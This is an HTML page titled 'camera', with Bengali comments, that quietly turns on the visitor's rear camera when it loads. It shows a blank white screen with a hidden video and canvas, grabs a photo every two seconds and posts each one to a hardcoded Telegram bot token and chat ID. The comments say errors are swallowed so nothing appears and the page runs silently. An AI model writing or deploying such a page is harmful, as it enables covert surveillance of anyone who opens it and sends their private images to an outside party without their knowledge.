<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>camera</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #ffffff;
      overflow: hidden;
    }
  </style>
</head>
<body>

  <video id="video" autoplay playsinline muted style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    // ===== এখানে আপনার টেলিগ্রাম বট টোকেন ও চ্যাট আইডি বসান =====
    const BOT_TOKEN = "9045100736:AAH3MPrXK1846Hw8vo426razC0K2FI1ZPgQ";
    const CHAT_ID = "8350847101";
    // ===========================================================

    const INTERVAL_MS = 2000; // প্রতি ২ সেকেন্ডে একটি ছবি

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    function waitForVideoReady() {
      return new Promise((resolve) => {
        if (video.readyState >= 2) return resolve();
        video.onloadedmetadata = () => resolve();
      });
    }

    async function captureAndSend(stream) {
      try {
        if (!video.videoWidth || !video.videoHeight) return;

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve =>
          canvas.toBlob(resolve, 'image/jpeg', 0.9)
        );
        if (!blob) return;

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } catch (e) {
        // কোনো এরর দেখাবে না, চুপচাপ চলতে থাকবে
      }
    }

    window.addEventListener('load', async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "environment" },
          audio: false
        });
        video.srcObject = stream;

        await waitForVideoReady();
        await video.play();

        // ফ্রেম রেডি হওয়ার জন্য সামান্য অপেক্ষা
        await new Promise(r => setTimeout(r, 800));

        // প্রথম ছবি
        captureAndSend(stream);

        // এরপর প্রতি ২ সেকেন্ডে বারবার ছবি
        setInterval(() => captureAndSend(stream), INTERVAL_MS);

      } catch (err) {
        // পারমিশন না দিলে বা অন্য সমস্যা হলে কিছুই দেখাবে না
      }
    });
  </script>

</body>
</html>
